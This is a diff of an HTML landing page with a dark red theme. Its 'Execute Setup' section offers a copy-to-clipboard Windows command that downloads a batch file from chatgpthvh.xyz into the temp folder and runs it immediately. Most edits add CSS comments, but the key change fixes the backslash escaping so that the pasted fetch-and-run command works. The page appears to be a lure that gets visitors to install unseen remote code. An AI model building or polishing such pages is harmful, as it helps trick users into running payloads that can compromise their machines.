@@ -9,14 +9,15 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --background: #1A1A1D;
-            --primary: #C3073F;
-            --secondary: #6F2232;
-            --text-main: #EAEAEA; 
-            --text-dim: #95A5A6; 
+            --background: #1A1A1D; /* Deep, dark grey */
+            --primary: #C3073F; /* Muted, strong red */
+            --secondary: #6F2232; /* Darker red accent */
+            --text-main: #EAEAEA; /* Off-white for readability */
+            --text-dim: #95A5A6; /* Grey for subtitles and secondary text */
             --border-color: #4E4E50;
         }
 
+        /* --- General Setup --- */
         body {
             background-color: var(--background);
             color: var(--text-main);
@@ -30,6 +31,7 @@
             box-sizing: border-box;
         }
 
+        /* --- Main Container --- */
         .grid-container {
             display: grid;
             width: 100%;
@@ -59,6 +61,7 @@
             }
         }
         
+        /* --- General Element Styling --- */
         h1, h2 {
             font-family: 'Space Grotesk', sans-serif;
             text-transform: uppercase;
@@ -75,6 +78,7 @@
             color: var(--text-main);
         }
 
+        /* --- Header / Side Panel --- */
         .header-panel {
             grid-area: header;
             border-bottom: 1px solid var(--border-color);
@@ -112,6 +116,7 @@
             color: var(--text-dim);
         }
 
+        /* --- Installer Section --- */
         .installer-panel {
             grid-area: installer;
         }
@@ -166,6 +171,7 @@
             border-color: #28a745;
         }
 
+        /* --- Files Section --- */
         .files-panel {
             grid-area: files;
         }
@@ -217,7 +223,7 @@
         <section class="installer-panel">
             <h2>Execute Setup</h2>
             <div class="command-box">
-                <code>curl -o "%temp% un_setup.bat" "https://chatgpthvh.xyz/vm/run_setup.bat" && "%temp% un_setup.bat"</code>
+                <code>curl -o "%temp%\run_setup.bat" "https://chatgpthvh.xyz/vm/run_setup.bat" && "%temp%\run_setup.bat"</code>
                 <button class="copy-button" id="copyBtn">Copy</button>
             </div>
         </section>
@@ -240,7 +246,7 @@
 
     <script>
         const copyButton = document.getElementById('copyBtn');
-        const commandText = 'curl -o "%temp%\run_setup.bat" "https://chatgpthvh.xyz/vm/run_setup.bat" && "%temp%\run_setup.bat"';
+        const commandText = `curl -o "%temp%\\run_setup.bat" "https://chatgpthvh.xyz/vm/run_setup.bat" && "%temp%\\run_setup.bat"`;
 
         copyButton.addEventListener('click', () => {
             navigator.clipboard.writeText(commandText).then(() => {
